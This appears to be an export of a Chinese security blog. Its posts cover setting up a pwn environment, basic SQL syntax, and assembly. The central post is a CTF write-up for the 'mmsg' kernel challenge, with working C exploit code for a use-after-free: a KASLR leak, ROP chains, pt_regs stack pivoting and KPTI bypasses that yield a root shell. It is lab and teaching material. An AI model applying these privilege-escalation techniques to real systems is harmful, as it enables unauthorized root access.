{"posts":[{"title":"pwn init","text":"搭建一个pwn环境。 apt or apt-get? 虽然我使用apt出现warning,但是依然能用 在脚本中，更加推荐 apt-get -y yes 避免交互而产生错误 VM or WSL 安装必备的应用 root下使用，但是普通用户无法使用gdb插件功能，因为gdbinit文件的位置，我们可以复制一份到自己的用户目录下12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#!/bin/shcd ~apt-get update &amp;&amp; apt-get upgradeapt-get install -y patchelfapt-get install -y wgetapt-get install -y zipapt-get install -y tzdataapt-get install -y libncursesw5-dev libgdbm-dev libc6-dev opensslapt-get install -y --fix-missing python3 python3-pip python3-dev lib32z1 \\ xinetd curl gcc gdb gdbserver g++ git libssl-dev libffi-dev build-essential tmux \\ vim netcat iputils-ping cpio file net-tools socat ruby ruby-dev locales \\ autoconf automake libtool make zsh openssh-server openssh-client \\ gdb-multiarch bison clang# python工具python3 -m pip install capstone filebytes unicorn keystone-engine ropper z3-solver angr# pwntools# 换源，可选# pip3 config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simplepython3 -m pip install --upgrade pip python3 -m pip install --upgrade pwntools# ROPgadgetpython3 -m pip install ROPgadget# pwndbgcd ~git clone https://github.com/pwndbg/pwndbg cd pwndbg ./setup.sh# pwngdbcd ~git clone https://github.com/scwuapt-getx/Pwngdb.git cat ~/Pwngdb/.gdbinit &gt;&gt; ~/.gdbinit# gem源gem sources --add https://mirrors.tuna.tsinghua.edu.cn/rubygems/ --remove https://rubygems.org/# seccomp-toolsgem install seccomp-tools# one_gadgetgem install one_gadget# pwninitapt-get install liblzma-dev pkgconfapt-get install cargocargo install pwninit# docker 自己选择# apt-get install docker.io# qemu 自己选择# apt-get install qemu qemu-system qemu-user-static binfmt-support Docker 搭建更加容易 由于某些题目没有Libc版本，而是给出了Dockerfile。或者说，不想下载虚拟机。 glibc-all-in-one 下载一个libc 进行patch(但是patchelf容易导致程序破坏). 自己的docker环境 docker环境搭建: 更改VERSION就行，禁止交互。 1234567891011121314151617181920ARG VERSION=20.04FROM ubuntu:$VERSIONARG DEBIAN_FRONTEND noninteractive # ENV TZ=Asia/Shanghai########## solve some error ############### 定义时区参数ENV TZ=Asia/Shanghai# 设置时区RUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime &amp;&amp; echo '$TZ' &gt; /etc/timezone# 设置编码ENV LANG C.UTF-8USER rootWORKDIR /rootCOPY ./pwninit.sh /rootRUN chmod +x /root/pwninit.sh &amp;&amp; /root/pwninit pwninit: 只需要安装部分工具 123456789101112131415161718192021222324252627#!/bin/shcd ~apt-get update &amp;&amp; apt-get upgradeapt-get install -y libncursesw5-dev libgdbm-dev libc6-dev opensslapt-get install -y python3 python3-pip python3-dev lib32z1 \\ curl gcc gdb gdbserver g++ git libssl-dev libffi-dev build-essential tmux \\ vim netcat iputils-ping cpio file net-tools locales \\ autoconf automake libtool make zsh openssh-server openssh-client \\ gdb-multiarch bison clang# otherspython3 -m pip install capstone filebytes unicorn keystone-engine ropper# pwntools# 换源，可选# pip3 config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simplepython3 -m pip install --upgrade pip python3 -m pip install --upgrade pwntools# ROPgadgetpython3 -m pip install ROPgadget# pwndbgcd ~git clone https://github.com/pwndbg/pwndbg cd pwndbg ./setup.sh 创建一个容器 1234docker build -h &lt;repo&gt;:&lt;tag&gt; .# -f 指定dockerfile# repo 形式 xxx/xxxdocker ps -a 进入docker 12docker run -it ubuntu:VERSION /bin/bash# -v dir:dir 共享文件夹 docker 命令 -i: 交互式 -t: terminl -v hostDir:dockerDir 共享文件夹 ps -a: 查看所有的容器 停止后重新计入容器 12docker start &lt;ID&gt;docker attach &lt;ID&gt; 停止容器 1docker stop &lt;ID&gt; 删除容器 1docker rm &lt;ID&gt; 删除镜像 1docker rmi &lt;ID&gt; 报错处理 error 1 123456******Your encoding (ANSI_X3.4-1968) is different than UTF-8. pwndbg might not work properly.You might try launching gdb with: LC_ALL=en_US.UTF-8 PYTHONIOENCODING=UTF-8 gdbMake sure that en_US.UTF-8 is activated in /etc/locale.gen and you called locale-gen****** error 2 1234567891011Traceback (most recent call last): File &quot;/root/pwndbg/gdbinit.py&quot;, line 58, in &lt;module&gt; import pwndbg # noqa: F401 File &quot;/root/pwndbg/pwndbg/__init__.py&quot;, line 86, in &lt;module&gt; config_mod.init_params() File &quot;/root/pwndbg/pwndbg/gdblib/config.py&quot;, line 159, in init_params Parameter(p) File &quot;/root/pwndbg/pwndbg/gdblib/config.py&quot;, line 45, in __init__ self.value = param.valueUnicodeEncodeError: 'ascii' codec can't encode characters in position 0-1: ordinal not in range(128)------- tip of the day (disable with set show-tips off) ------- 出现了如上错误。寻找到一个(issue)[https://github.com/pwndbg/pwndbg/issues/1539] error1，修改dockerfile的类似如下变量。选择中国 error2 也解决了。 123456789# ENV LANG en_US.utf8# 我们的设置# 定义时区参数ENV TZ=Asia/Shanghai# 设置时区RUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime &amp;&amp; echo '$TZ' &gt; /etc/timezone# 设置编码ENV LANG C.UTF-8 docker-compose 创建多个docker。","link":"/2023/06/05/Pwn%20init/"},{"title":"peekgeek mmsg","text":"做题踩坑实录，赛后复现. step1: init 拿到附件，查看启动脚本，smep, smap, kaslr，应该还有pti 12345678910111213#!/bin/bashqemu-system-x86_64 \\ -m 256M \\ -cpu host,+smep,+smap \\ -smp cores=1 \\ -kernel bzImage \\ -hda rootfs.img \\ -nographic \\ -monitor none \\ -snapshot \\ -enable-kvm \\ -append &quot;console=ttyS0 root=/dev/sda rw kaslr rdinit=/sbin/init quiet oops=panic panic=1&quot; \\ -no-reboot ext4 镜像挂载 123mkdir rootfssudo mount rootfs.img ./rootfs 查看init， etc/init.d 下的文件 12345678910111213141516171819202122232425262728#!/bin/shchown -R root:root /chmod 700 /rootchown -R ctf:ctf /home/ctfchown root:root /root/flagchmod 600 /root/flagmount -t proc none /procmount -t sysfs none /sysmount -t tmpfs tmpfs /tmpmkdir /dev/ptsmount -t devpts devpts /dev/pts# echo 1 &gt; /proc/sys/kernel/dmesg_restrict# echo 1 &gt; /proc/sys/kernel/kptr_restrictinsmod /root/mmsg.kochmod 666 /dev/mmsgecho -e &quot;\\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\\n&quot;cd /home/ctf# setsid cttyhack su ctf -c /bin/shsetsid cttyhack setuidgid 1000 /bin/sh# setsid cttyhack setuidgid 0 /bin/shpoweroff -d 0 -f 修改内容，将ko文件拷贝一份，etc/init.d/rcS内容修改一下，然后umount，启动。（修改效果生效必须要umount） 1sudo mount ./rootfs 内核版本 5.10.186 step2: ko 逆向分析ko文件（直接给出了c文件，也可以不看）。漏洞所在的地方，类似入门经典题目kernel UAF - CTF Wiki。但是结构体大小0x20 123456789101112131415161718192021222324252627282930313233static struct mmsg_head *mmsg_head; ...static struct miscdevice mmsg_device;...static int module_close(struct inode *inode, struct file *file) { kfree(mmsg_head); return SUCCESS;}...static int __init mmsg_module_init(void) { mmsg_device.minor = MISC_DYNAMIC_MINOR; mmsg_device.name = DEVICE_NAME; mmsg_device.fops = &amp;module_fops; misc_register(&amp;mmsg_device); mmsg_head = kmalloc(sizeof(struct mmsg_head), GFP_KERNEL); strncpy(mmsg_head-&gt;description, DEVICE_NAME &quot;-mmsg_head&quot;, 15); INIT_LIST_HEAD(&amp;mmsg_head-&gt;list); printk(KERN_INFO &quot;Hello, World!\\n&quot;); return SUCCESS;}static void __exit mmsg_module_exit(void) { misc_deregister(&amp;mmsg_device); printk(KERN_INFO &quot;Goodbye, World!\\n&quot;);} step3: exploit 尝试ROP，但是不太会🤡 1原文内容： 「PWN」内核 PWN 题目的第一次尝试 像，很像呀。看了一下，发现及其类似，于是尝试使用类似的exp进行做 调试，找地址，先关闭kaslr，通过泄露获得offset 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157/* * gcc exp.c -static -o exp */#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;#include &lt;signal.h&gt;#include &lt;unistd.h&gt;#include &lt;linux/fs.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/mman.h&gt;int fd1, fd2;int seq_fd;size_t buf[4];char *dev_name = &quot;/dev/mmsg&quot;;// kernel base =&gt; cat /proc/kallsyms | grep startup_64size_t kernel_base;size_t kernel_offset;// nokalr kernel basesize_t nokaslr = 0xffffffff81000000;/* * cat /sys/module/mmsg/sections/.text * 0xffffffffc03f5000 */// close kaslr// grep prepare_kernel_cred /proc/kallsymssize_t prepare_kernel_cred = 0xffffffff9248d790;// grep commit_creds /proc/kallsymssize_t commit_creds = 0xffffffff9248d350;// grep swapgs_restore_regs_and_return_to_usermode /proc/kallsymssize_t swapgs_restore_regs_and_return_to_usermode = 0xffffffff93000e30;// grep native_write_cr4 /proc/kallsymssize_t native_write_cr4 = 0xffffffffa8832250;// ropper// pop rdi; retsize_t pop_rdi_ret = 0xffffffff812274dd;// 0xffffffff82d63c0d: mov edi, eax; call rbx;// 在 64 位环境下，目的寄存器若是 32 位，则会将高 32 位清零size_t mov_edi_eax_call_rbx = 0xffffffff82d63c0d;// 0xffffffff82e6f708: pop rbx; ret; size_t pop_rbx_ret = 0xffffffff82e6f708;struct mmsg_arg { unsigned long token; int top; int size; char *data;};void new() {}void delete() {}void recv_mmsg() {}void copy_mmsg() {}void put_mmsg(int fd, char *addr) { struct mmsg_arg arg; memset(&amp;arg, 0, sizeof(struct mmsg_arg)); arg.data = addr; ioctl(fd, 0x5555555, &amp;arg);}void get_mmsg(int fd) { struct mmsg_arg arg; memset(&amp;arg, 0, sizeof(struct mmsg_arg)); memset(buf, 0, sizeof(buf)); arg.data = (char *)buf; ioctl(fd, 0x6666666, &amp;arg);}void err_exit(char *msg){ printf(&quot;\\033[31m\\033[1m[x] Error at: \\033[0m%s\\n&quot;, msg); exit(EXIT_FAILURE);}uint64_t user_cs, user_ss, user_rflags, user_rsp;void save_status(){ asm( &quot;movq %%cs, %0;&quot; &quot;movq %%ss, %1;&quot; &quot;movq %%rsp, %3;&quot; &quot;pushfq;&quot; &quot;pop %2;&quot; : &quot;=r&quot;(user_cs),&quot;=r&quot;(user_ss),&quot;=r&quot;(user_rflags),&quot;=r&quot;(user_rsp) : : &quot;memory&quot; );}void get_shell(void){ if( getuid() ) { err_exit(&quot;\\033[31m\\033[1m[x] Failed to get the root!\\033[0m&quot;); } puts(&quot;\\033[32m\\033[1m[+] Successful to get the root. \\033[0m&quot;); system(&quot;/bin/sh&quot;); exit(0);}int seq_open(){ int seq; if ( (seq=open(&quot;/proc/self/stat&quot;, O_RDONLY)) == -1) { err_exit(&quot;[x] seq open fail&quot;); } return seq;}void uaf() { fd1 = open(dev_name, O_RDWR); if (fd1 &lt; 0) { err_exit(&quot;[x] open device 1&quot;); } fd2 = open(dev_name, O_RDWR); if (fd2 &lt; 0) { err_exit(&quot;[x] open device 2&quot;); } close(fd1);}void leak_base() { // read 操作，经过函数调用链则会最终调用 seq_operations-&gt;start 指针对应的函数 seq_fd = seq_open(); get_mmsg(fd2); for (int j = 0; j &lt; 4; j++) { printf(&quot;buf[%d] =&gt; 0x%llx\\n&quot;, j, buf[j]); } kernel_base = buf[0] - 0x20fac0; printf(&quot;kernel base =&gt; 0x%llx&quot;, kernel_base); kernel_offset = kernel_base - nokaslr;}int main() { save_status(); uaf(); leak_base();} rop 12345678910111213141516171819202122232425262728293031// 之前的都一样#if 1 #define o(x) (x+kernel_offset)#endif // smep userspace地址被标记为non-executable // bypass: stack prviot size_t payload[0x40]; int idx=0; size_t user_rip = (size_t)get_shell; payload[idx++] = o(pop_rbx_ret); payload[idx++] = o(commit_creds); payload[idx++] = o(pop_rdi_ret); // return address payload[idx++] = 0x0; payload[idx++] = o(prepare_kernel_cred); payload[idx++] = o(mov_edi_eax_call_rbx); payload[idx++] = o(swapgs_restore_regs_and_return_to_usermode) + 22; payload[idx++] = 0x0; payload[idx++] = 0x0; payload[idx++] = user_rip; payload[idx++] = user_cs; payload[idx++] = user_rflags; payload[idx++] = user_rsp; payload[idx++] = user_ss; put_mmsg(fd2, (char *)&amp;payload); // trigger seq_file-&gt;start read(seq_fd, NULL, 1);} 使用xchg 进行类似栈迁移的操作，从而进行劫持函数执行流 在本地执行时，直接kernel panic。查看报错信息，发现是can't access memory in 0x????(是个用户地址)。 2后来看来一下这篇文章发现原因：Kernel Pwn Struct seq_operations and Struct pt_regs 这一题开启了smap，而 pwnhub 的那一题中没有。而smap: kernel space 不能 access user space 的东西。 这篇文章中说了一个 pt_regs 的结构体，在使用syscall 时，会将某些寄存器内容压入内核栈的栈底.12345678910111213141516171819202122232425262728293031323334struct pt_regs {/* * C ABI says these regs are callee-preserved. They aren't saved on kernel entry * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;. */ unsigned long r15; unsigned long r14; unsigned long r13; unsigned long r12; unsigned long rbp; unsigned long rbx;/* These regs are callee-clobbered. Always saved on kernel entry. */ unsigned long r11; unsigned long r10; unsigned long r9; unsigned long r8; unsigned long rax; unsigned long rcx; unsigned long rdx; unsigned long rsi; unsigned long rdi;/* * On syscall entry, this is syscall#. On CPU exception, this is error code. * On hw interrupt, it's IRQ number: */ unsigned long orig_rax;/* Return frame for iretq */ unsigned long rip; unsigned long cs; unsigned long eflags; unsigned long rsp; unsigned long ss;/* top of stack page */}; 在系统调用的过程中, 不是所有的寄存器都会被改变, 比如 r8 - r15, 他们会在压入 pt_regs 的时保持 syscall 之前的值. 这就为我们提供了布置数据的可能性. 如果在仅能劫持 rip 的情况下 (比如上面介绍的 seq_operations), 跳转到某个形如 add, rsp val; ret 的 gadget, 那么就有可能将 rsp 设置到内核栈的 pt_regs 上, 从而执行我们布置的 ROP 链. 也就是我们 rop 往 内核栈的 pt_regs 中跳转，就不会绕过了smap 如何将寄存器压入: 使用了巧妙地方法，syscall 调用 read，将寄存器压入，并且可以通过seq_operations-&gt;start执行rop 调用模板+解释的比较详细的文章：seq_operations+pt_regs 123456789101112131415161718__asm__( &quot;mov r15, 0x55555555;&quot; &quot;mov r14, 0x44444444;&quot; &quot;mov r13, 0x33333333;&quot; &quot;mov r12, 0x22222222;&quot; &quot;mov rbp, 0xbbbb1111;&quot; &quot;mov rbx, 0xbbbb2222;&quot; &quot;mov r11, 0x11111111;&quot; &quot;mov r10, 0x11110000;&quot; &quot;mov r9, 0x99999999;&quot; &quot;mov r8, 0x88888888;&quot; &quot;xor rax, rax;&quot; &quot;mov rcx, 0x666666;&quot; &quot;mov rdx, 8;&quot; &quot;mov rsi, rsp;&quot; &quot;mov rdi, seq_fd;&quot; &quot;syscall&quot; ); gadget: 改变rsp, add rsp, xxx; ret，进行栈迁移 123pwndbg&gt; x/2wi 0xffffffff81909b8c 0xffffffff81909b8c: add rsp,0x168 0xffffffff81909b93: ret 但是我们需要事先知道执行start 时与pt_regs 距离多远。 直接使用没有布局的脚本，自然会kernel panic，可以看到rip的内容，然后与上述的payload进行对比，获得偏移 并且这并不是一个万能的方法 3 后来还是不对，因此再看参考文章，如下也存在uaf问题。123456789101112131415161718192021// module_ioctlstruct mmsg_head { char description[16]; struct list_head list;};case MMSG_RECV: if (arg.top) { m = list_entry(&amp;mmsg_head-&gt;list, struct mmsg, list); // head } else { m = find_mmsg(arg.token); // 遍历查询 } if (m == NULL || arg.size &gt; m-&gt;size || arg.size &lt;= 0) { ret = -EINVAL; break; } printk(KERN_INFO &quot;mmsg recv\\n&quot;); copy_to_user((void __user *)arg.data, m-&gt;data, arg.size); list_del(&amp;m-&gt;list); // 双向链表元素内核提供的删除函数 kfree(m-&gt;data); // head 没有，但是固定偏移为8的地方，相当于free掉list，不会报错 kfree(m); break; 4偏移确定 add rsp val，我们需要一个比较具体的值 大概是 0x100+ 的gadget吧，不太会，但是此结构体大小大于0x100，并且要开启syscall的栈帧 应该可以在ioctl 下断点，但是我失败了😥 执行流程 直接看报错: BUG: unable to handle page fault for address: 0000000044444444 ； RIP: 0010:0x44444444获得我们rip指针控制的寄存器 r14 syscall 不会改变 r8-r15内容。理想情况下r8-r15内容不变，但是可能会产生奇妙的变化。调试，si会走到start指针的操作，从而获得栈结构 假设理想化从r14-r8没有发生改变 si 一路走，但是看不到对应内容? KERNEL_PWN状态切换原理及KPTI绕过 swapgs; iretq 返回用户态; ret rip,在此处没有使用ret指令，直接iretq, 直接r9为user_rsp就行 1234567swapgs iretq rsp ---&gt; rip cs rflags rsp ss swapgs_restore_regs_and_return_to_usermode: 这个比上个复杂一点，需要在迁移一次 12345678swapgs_restore_regs_and_return_to_usermode + 22 0 // padding 0 // padding get_shelluser_cs user_rflags user_spuser_ss errors qemu cpu为 host 也必须开启kvm, 同时就是这一点，导致我一直不成功，后来去除掉kvm将cpu改为kvm64成功。应该是本机的CPU的安全防护导致一直失败😥。 exploit signal bypass kpti。执行用户态的任意代码都会报出信号SIGSEGV，那么在程序开始时将SIGSEGV与shell函数绑定在一起，那么访问用户态代码时就会报出信号SIGSEGV，就会执行信号函数。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169#include &lt;stdio.h&gt;#include &lt;errno.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;signal.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/ioctl.h&gt;#define COLOR_GREEN &quot;\\033[32m&quot;#define COLOR_RED &quot;\\033[31m&quot;#define COLOR_YELLOW &quot;\\033[33m&quot;#define COLOR_DEFAULT &quot;\\033[0m&quot;#define log_debug(fmt, ...) \\ dprintf(2, &quot;[*] %s:%d &quot; fmt &quot;\\n&quot;, __FILE__, __LINE__, ##__VA_ARGS__)#define log_info(fmt, ...) \\ dprintf(2, COLOR_GREEN &quot;[+] %s:%d &quot; fmt &quot;\\n&quot; COLOR_DEFAULT, __FILE__, \\ __LINE__, ##__VA_ARGS__)#define log_warning(fmt, ...) \\ dprintf(2, COLOR_YELLOW &quot;[!] %s:%d &quot; fmt &quot;\\n&quot; COLOR_DEFAULT, __FILE__, \\ __LINE__, ##__VA_ARGS__)#define log_error(fmt, ...) \\ dprintf(2, COLOR_RED &quot;[-] %s:%d &quot; fmt &quot;\\n&quot; COLOR_DEFAULT, __FILE__, \\ __LINE__, ##__VA_ARGS__)#define die(fmt, ...) \\ do { \\ log_error(fmt, ##__VA_ARGS__); \\ log_error(&quot;Exit at line %d&quot;, __LINE__); \\ exit(1); \\ } while (0)void get_shell(){ if( getuid() ) { die(&quot;fail to get shell&quot;); } log_info(&quot;start to get root shell&quot;); system(&quot;/bin/sh&quot;); exit(0);}size_t user_cs, user_ss, user_rflags, user_rsp;void save_status(){ __asm__(&quot;mov user_cs, cs;&quot; &quot;mov user_ss, ss;&quot; &quot;mov user_rsp, rsp;&quot; &quot;pushf;&quot; &quot;pop user_rflags;&quot; ); log_info(&quot;status saved&quot;);}int seq_open(){ int seq; if ( (seq=open(&quot;/proc/self/stat&quot;, O_RDONLY)) == -1) { die(&quot;seq open fail&quot;); } return seq;}#define MMSG_ALLOC 0x1111111#define MMSG_COPY 0x2222222#define MMSG_RECV 0x3333333#define MMSG_UPDATE 0x4444444#define MMSG_PUT_DESC 0x5555555#define MMSG_GET_DESC 0x6666666struct mmsg_arg { unsigned long token; int top; int size; char *data;};size_t kernel_base = 0;size_t kernel_offset = 0;size_t nokaslr = 0xffffffff81000000;size_t prepare_kernel_cred = 0xffffffff9248d790;size_t commit_creds = 0xffffffff8108d350;size_t swapgs_restore_regs_and_return_to_usermode = 0xffffffff93000e30;size_t pop_rdi_ret = 0xffffffff811aa376;size_t init_cred = 0xffffffff8264c9a0;size_t swapgs_iretq = 0xffffffff81c00ec6;size_t add_rsp_0x168_ret = 0xffffffff81909b8c;int mmsg_fd;int seq_fd;void exploit() { log_info(&quot;open device&quot;); mmsg_fd = open(&quot;/dev/mmsg&quot;, O_RDWR); if (mmsg_fd &lt; 0) { die(&quot;open device&quot;); } struct mmsg_arg arg; arg.token = 1; arg.top = 1; arg.size = 16; arg.data = malloc(16); size_t *buf = (size_t *)arg.data; buf[0] = 0x1145141145141145ull; buf[1] = 0; ioctl(mmsg_fd, MMSG_PUT_DESC, &amp;arg); // bypass size check ioctl(mmsg_fd, MMSG_RECV, &amp;arg); // free head seq_fd = seq_open(); ioctl(mmsg_fd, MMSG_GET_DESC, &amp;arg); log_warning(&quot;start leak info&quot;); for(int i = 0; i &lt; 2; i ++) { log_debug(&quot;buf[%d] =&gt; 0x%lx\\n&quot;, i, buf[i]); } kernel_base = buf[0] - 0x20fac0; kernel_offset = kernel_base - nokaslr; add_rsp_0x168_ret += kernel_offset; pop_rdi_ret += kernel_offset; init_cred += kernel_offset; commit_creds += kernel_offset; swapgs_iretq += kernel_offset; log_info(&quot;kernel_offset =&gt; 0x%lx&quot;, kernel_offset); log_info(&quot;kernel_base =&gt; 0x%lx&quot;, kernel_base); buf[0] = add_rsp_0x168_ret; log_info(&quot;pollute =&gt; 0x%lx, maybe we can debug here&quot;, buf[0]); ioctl(mmsg_fd, MMSG_PUT_DESC, &amp;arg); getchar(); __asm__( &quot;mov r15, 0xbeefdead;&quot; &quot;mov r14, pop_rdi_ret;&quot; // &lt;- rip here &quot;mov r13, init_cred;&quot; &quot;mov r12, commit_creds;&quot; &quot;mov rbp, swapgs_iretq;&quot; &quot;mov rbx, 0x55555555;&quot; &quot;mov r11, 0x66666666;&quot; &quot;mov r10, 0x77777777;&quot; &quot;mov r9, user_rsp;&quot; &quot;mov r8, 0x99999999;&quot; &quot;xor rax, rax;&quot; &quot;mov rcx, 0xaaaaaaaa;&quot; &quot;mov rdx, 8;&quot; &quot;mov rsi, rsp;&quot; &quot;mov rdi, seq_fd;&quot; // 这里假定通过 seq_operations-&gt;stat 来触发 &quot;syscall&quot; );}int main() { signal(SIGSEGV, get_shell); save_status(); exploit();} cr3 bypass kpti，在高版本使用，在 +22 地址是我们利用的gadget。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748swapgs_restore_regs_and_return_to_usermode.text:FFFFFFFF81600A34 41 5F pop r15.text:FFFFFFFF81600A36 41 5E pop r14.text:FFFFFFFF81600A38 41 5D pop r13.text:FFFFFFFF81600A3A 41 5C pop r12.text:FFFFFFFF81600A3C 5D pop rbp.text:FFFFFFFF81600A3D 5B pop rbx.text:FFFFFFFF81600A3E 41 5B pop r11.text:FFFFFFFF81600A40 41 5A pop r10.text:FFFFFFFF81600A42 41 59 pop r9.text:FFFFFFFF81600A44 41 58 pop r8.text:FFFFFFFF81600A46 58 pop rax.text:FFFFFFFF81600A47 59 pop rcx.text:FFFFFFFF81600A48 5A pop rdx.text:FFFFFFFF81600A49 5E pop rsi.text:FFFFFFFF81600A4A 48 89 E7 mov rdi, rsp &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;.text:FFFFFFFF81600A4D 65 48 8B 24 25+ mov rsp, gs: 0x5004.text:FFFFFFFF81600A56 FF 77 30 push qword ptr [rdi+30h].text:FFFFFFFF81600A59 FF 77 28 push qword ptr [rdi+28h].text:FFFFFFFF81600A5C FF 77 20 push qword ptr [rdi+20h].text:FFFFFFFF81600A5F FF 77 18 push qword ptr [rdi+18h].text:FFFFFFFF81600A62 FF 77 10 push qword ptr [rdi+10h].text:FFFFFFFF81600A65 FF 37 push qword ptr [rdi].text:FFFFFFFF81600A67 50 push rax.text:FFFFFFFF81600A68 EB 43 nop.text:FFFFFFFF81600A6A 0F 20 DF mov rdi, cr3.text:FFFFFFFF81600A6D EB 34 jmp 0xFFFFFFFF81600AA3.text:FFFFFFFF81600AA3 48 81 CF 00 10+ or rdi, 1000h.text:FFFFFFFF81600AAA 0F 22 DF mov cr3, rdi.text:FFFFFFFF81600AAD 58 pop rax.text:FFFFFFFF81600AAE 5F pop rdi.text:FFFFFFFF81600AAF FF 15 23 65 62+ call cs: SWAPGS.text:FFFFFFFF81600AB5 FF 25 15 65 62+ jmp cs: INTERRUPT_RETURN_SWAPGS.text:FFFFFFFF8103EFC0 55 push rbp.text:FFFFFFFF8103EFC1 48 89 E5 mov rbp, rsp.text:FFFFFFFF8103EFC4 0F 01 F8 swapgs.text:FFFFFFFF8103EFC7 5D pop rbp.text:FFFFFFFF8103EFC8 C3 retn_INTERRUPT_RETURN.text:FFFFFFFF81600AE0 F6 44 24 20 04 test byte ptr [rsp+0x20], 4.text:FFFFFFFF81600AE5 75 02 jnz native_irq_return_ldt.text:FFFFFFFF81600AE7 48 CF iretq 看别人的做法，好像不需要关注rip后面的内容，但是本题我没有使用这种方式做出来 👀。 最后需要我们调用getshell函数。 1234567891011121314151617181920 __asm__( &quot;mov r15, 0xbeefdead;&quot; &quot;mov r14, pop_rdi_ret;&quot; // &lt;- rip here &quot;mov r13, init_cred;&quot; &quot;mov r12, commit_creds;&quot; &quot;mov rbp, swapgs_restore_regs_and_return_to_usermode + 22;&quot; &quot;mov rbx, 0x55555555;&quot; &quot;mov r11, 0x66666666;&quot; &quot;mov r10, 0x77777777;&quot; &quot;mov r9, user_rsp;&quot; &quot;mov r8, 0x99999999;&quot; &quot;xor rax, rax;&quot; &quot;mov rcx, 0xaaaaaaaa;&quot; &quot;mov rdx, 8;&quot; &quot;mov rsi, rsp;&quot; &quot;mov rdi, seq_fd;&quot; );get_shell(); tips commit_creds(prepare_kernel_cred (0)) =&gt; 简化为 commit_creds(&amp;init_cred) init_cred: init 进程的权限，为root，在 /proc/kallsyms 内 寻找 gadget 时可能寻找到的gadget不能使用，报错为 kernel tried to execute NX-protected page，说明其地址不可访问？那就只能换了 为什么找不对gadget?或者根本没有找到🤡。和参考的看看了一下，发现gadget地址根本就没找对。 ropper + ROPgadget + ropr 三个工具一起使用，获得三个gadget文件。 extract-vmlinux + vmlinux-to-elf 工具 如何下断点？ 在想暂停的的地方使用 getchar() 停止后一路si 在固定的指令地址下断点，但是需要事先知道地址。但是rop时，地址一般都是知道的。 在固定的指令下断点，比如此题就可以在在 add rsp 那一条指令下断点 12345678910111213 0xffffffff81909b8c add rsp, module_ioctl+56 &lt;0x168&gt; 0xffffffff81909b93 retpwndbg&gt; tele 0xffffc900001c7df8+0x168 00:0000 0xffffc900001c7f60 0x44444444 /* 'DDDD' */01:0008 0xffffc900001c7f68 0x33333333 /* '3333' */02:0010 0xffffc900001c7f70 0x22222222 /* '&quot;&quot;&quot;&quot;' */03:0018 0xffffc900001c7f78 0xbbbb111104:0020 0xffffc900001c7f80 0xbbbb222205:0028 0xffffc900001c7f88 0x24606:0030 0xffffc900001c7f90 0x1111000007:0038 0xffffc900001c7f98 0x9999999908:0040 0xffffc900001c7fa0 0x88888888","link":"/2023/07/28/peekgeek%20mmsg/"},{"title":"常用数据库基本语法","text":"简单学习增删改查 三个最广泛使用的开源 RDBMS：SQLite、MySQL 和 PostgreSQL。关系型数据库 因为SQL的标准，三个数据库差不多的语法。 SQLMySQL 其实是开源 MariaDB 数据库 1234567891011-- 创建CREATE DATABASE db_name; -- 删除DROP DATABASE db_name; -- 查看show databases;-- 连接use database_name; 表 123456789101112131415-- 创建CREATE TABLE table_name ( column_name data_type 属性 );SHOW tables;-- 删除DROP TABLE table_name;-- 查询SELECT column_name from table_name;-- 增加INSERT into table_name(column_name) values(&quot;xxx&quot;); 数据类型 查询限定 12345678-- 排序order by-- 属性限定WHERE, AND, OR-- 结果个数limit PostgreSQL 数据库 123456789-- 创建CREATE DATABASE db_name; -- 删除DROP DATABASE db_name; -- 查看-- 连接 表 12345678910111213-- 创建CREATE TABLE table_name ( column_name data_type 属性 );-- 删除DROP TABLE table_name;-- 查询SELECT column_name from table_name;-- 增加INSERT into table_name(column_name) values(&quot;xxx&quot;); 查询 12345678-- 排序order by-- 去重distinct-- 属性限定WHERE, AND, OR SQLite sqlite3 命令 123456789.help; -- 帮助信息.open test.db; -- 打开文件，如果没有就创建.show; -- 显示一系列属性.quit -- 退出.databases -- 显示数据库 创建数据库 123-- 读取或者创建sqlite3 name.open name 导入导出数据库 123.dump -- 将数据库导出SQL 文件 sqlite3 test.db .dump &gt; test.sqlsqlite3 test.db &lt; test.db 创建表 12345678910.tables -- 显示表.schema -- 表的信息CREATE TABLE table_name ( column_name type primary key)DROP TABLE database.table_name;INSERT INTO table_name(&quot;cloumn_name&quot;) values (&quot;value&quot;) 查询 1-- 还是SELECT 语句 编程操作 使用C语言操作数据库，其余编程语言操作数据库也差不多，主要是写SQL语句的操作。","link":"/2023/06/30/%E5%B8%B8%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/"},{"title":"汇编学习","text":"基本的汇编学习。 学习目标：首先能看懂。然后尝试编写 shellcode。 个人习惯小写指令。 little-endian 常见的汇编格式 Intel格式。 AT&amp;T，实际使用也很常见(Linux中默认的格式) 部分名词 1234ISA: Instruction Set Architecture, 指令集架构RISC: Reduced Instruction Set Computer, 精简指令集计算机CISC: Complex Instruction Set Computer, 复杂指令集计算机ABI: application binary interface 环境问题 本机 linux: ubuntu 